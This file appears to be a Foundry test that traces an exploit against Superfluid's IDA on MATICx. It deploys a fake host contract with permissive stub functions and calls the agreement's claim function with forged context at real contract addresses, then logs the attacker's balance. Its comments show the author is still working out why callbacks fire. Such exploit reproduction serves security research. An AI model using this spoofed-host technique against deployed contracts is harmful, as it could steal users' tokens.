// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IIDA { function claim(address,address,uint32,address,bytes calldata) external returns (bytes memory); }
interface IMATICx { function balanceOf(address) external view returns (uint256); function upgradeByETH() external payable; function downgradeToETH(uint256) external; function getHost() external view returns (address); }
interface ISuperfluid { function callAgreement(address,bytes calldata,bytes calldata) external returns (bytes memory); function isApp(address) external view returns (bool); function getAppManifest(address) external view returns (bool,bool,uint256); }

contract SimpleHost {
    address public immutable ida;
    address public immutable maticx;

    constructor(address _ida, address _maticx) { ida=_ida; maticx=_maticx; }

    function getAppManifest(address) external pure returns (bool,bool,uint256) { return (true,false,0); }
    function isApp(address) external pure returns (bool) { return true; }
    function isCtxValid(bytes calldata) external pure returns (bool) { return true; }
    function decodeCtx(bytes memory) external pure returns (uint8,uint8,uint256,address,bytes4,bytes memory,uint256,uint256,int256,address,address) { return (0,1,0,address(0),bytes4(0),"",0,0,0,address(0),address(0)); }
    function appCallbackPush(bytes calldata,address,uint256,int256,address) external pure returns (bytes memory) { return ""; }
    function appCallbackPop(bytes calldata,int256) external pure returns (bytes memory) { return ""; }
    function callAppBeforeCallback(address,bytes calldata,bool,bytes calldata) external returns (bytes memory) { return ""; }
    function callAppAfterCallback(address,bytes calldata,bool,bytes calldata ctx) external pure returns (bytes memory) { return ctx; }

    function doClaim(address publisher, uint32 indexId, address subscriber) external {
        bytes memory ctx = abi.encode(
            abi.encode(uint256(1<<32),uint256(0),address(0),bytes4(0),bytes("")),
            abi.encode(uint256(0),int256(0),address(0),address(0))
        );
        IIDA(ida).claim(maticx, publisher, indexId, subscriber, ctx);
    }
}

contract TraceFlowTest is Test {
    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICX = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;

    function testTraceClaimViaFakeHost() public {
        address attacker = address(this);
        vm.deal(attacker, 10 ether);

        // Setup
        IMATICx(MATICX).upgradeByETH{value: 1 ether}();
        uint32 idx = 888_000_000;

        ISuperfluid(HOST).callAgreement(IDA, abi.encodeWithSignature("createIndex(address,uint32,bytes)",MATICX,idx,new bytes(0)),"");
        ISuperfluid(HOST).callAgreement(IDA, abi.encodeWithSignature("updateSubscription(address,uint32,address,uint128,bytes)",MATICX,idx,attacker,uint128(1),new bytes(0)),"");
        ISuperfluid(HOST).callAgreement(IDA, abi.encodeWithSignature("updateIndex(address,uint32,uint128,bytes)",MATICX,idx,uint128(0.1 ether),new bytes(0)),"");

        console.log("MATICx before:", IMATICx(MATICX).balanceOf(attacker));
        console.log("MATICx host:", IMATICx(MATICX).getHost());
        console.log("Real host isApp(attacker):", ISuperfluid(HOST).isApp(attacker));

        // Now call claim via FakeHost
        SimpleHost fakeHost = new SimpleHost(IDA, MATICX);
        console.log("FakeHost:", address(fakeHost));
        console.log("FakeHost isApp(attacker):", fakeHost.isApp(attacker));

        // This call goes: FakeHost -> IDA.claim()
        // Inside IDA, it should call token.getHost() = REAL Host
        // Then REAL Host.getAppManifest(publisher=attacker) = false
        // So callbacks should NOT fire
        // But somehow in the current exploit they DO?
        fakeHost.doClaim(attacker, idx, attacker);

        console.log("MATICx after:", IMATICx(MATICX).balanceOf(attacker));
    }
}
